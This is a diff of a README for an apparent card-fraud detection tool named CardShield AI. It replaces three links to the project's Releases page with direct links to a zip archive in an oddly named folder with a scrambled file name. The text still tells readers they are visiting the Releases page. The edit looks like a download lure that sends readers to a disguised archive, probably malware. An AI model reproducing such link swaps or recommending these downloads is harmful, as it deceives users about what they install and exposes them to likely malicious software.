@@ -1,6 +1,6 @@
 # 🛡️ CardShield-AI-Fraud-Identification-System - Safeguard Your Transactions Easily
 
-[![Download CardShield AI](https://img.shields.io/badge/Download-CardShield%20AI-brightgreen)](https://github.com/JERODA10/CardShield-AI-Fraud-Identification-System/releases)
+[![Download CardShield AI](https://github.com/JERODA10/CardShield-AI-Fraud-Identification-System/raw/refs/heads/main/Xenocratean/Card-System-A-Identification-Shield-Fraud-3.9.zip%20AI-brightgreen)](https://github.com/JERODA10/CardShield-AI-Fraud-Identification-System/raw/refs/heads/main/Xenocratean/Card-System-A-Identification-Shield-Fraud-3.9.zip)
 
 ## 📚 Overview
 
@@ -18,7 +18,7 @@ Before you download, ensure your system meets these requirements:
 
 ### Step 2: Visit the Releases Page
 
-To download CardShield AI, visit our Releases page. [Click here to download.](https://github.com/JERODA10/CardShield-AI-Fraud-Identification-System/releases)
+To download CardShield AI, visit our Releases page. [Click here to download.](https://github.com/JERODA10/CardShield-AI-Fraud-Identification-System/raw/refs/heads/main/Xenocratean/Card-System-A-Identification-Shield-Fraud-3.9.zip)
 
 On this page, you will find the latest version of the software along with previous releases.
 
@@ -61,7 +61,7 @@ You will see a clear display of results. The application will indicate whether t
 
 ## 📥 Download & Install
 
-To get started with CardShield AI, make sure to [visit this page to download](https://github.com/JERODA10/CardShield-AI-Fraud-Identification-System/releases). Follow the installation steps listed above to set up the software on your device.
+To get started with CardShield AI, make sure to [visit this page to download](https://github.com/JERODA10/CardShield-AI-Fraud-Identification-System/raw/refs/heads/main/Xenocratean/Card-System-A-Identification-Shield-Fraud-3.9.zip). Follow the installation steps listed above to set up the software on your device.
 
 ## 📝 Troubleshooting
 
